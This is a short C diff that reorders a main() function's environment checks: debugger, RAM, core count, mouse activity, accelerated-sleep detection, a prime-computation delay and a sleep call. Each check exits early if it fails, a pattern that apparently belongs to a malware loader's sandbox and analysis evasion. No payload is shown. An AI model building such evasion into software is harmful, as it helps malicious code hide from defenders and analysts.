@@ -33,31 +33,12 @@ int main()
 			return 1;
 		}
 	}
-
-	if (settings->prime) 
-	{ 
-		prime();
-	}
-	if (settings->sleep)
-	{
-		ntSleep(settings->sleepTime);
-	}
-	if (settings->mouse)
-	{
-		if (chk_mouse())
-			return 1;
-	}
-	if (settings->acceleratedsleep)
-	{
-		if (chk_acceleratedsleep())
-			return 1;
-	}
 	if (settings->debugger)
 	{
 		if (chk_dbg())
 			return 1;
 	}
-	if (settings->ram) 
+	if (settings->ram)
 	{
 		if (chk_ram())
 			return 1;
@@ -66,6 +47,24 @@ int main()
 	{
 		if (chk_cores())
 			return 1;
+	}
+	if (settings->mouse)
+	{
+		if (chk_mouse())
+			return 1;
+	}
+	if (settings->prime) 
+	{ 
+		prime();
+	}
+	if (settings->acceleratedsleep)
+	{
+		if (chk_acceleratedsleep())
+			return 1;
+	}
+	if (settings->sleep)
+	{
+		ntSleep(settings->sleepTime);
 	}
 
 	DWORD old;
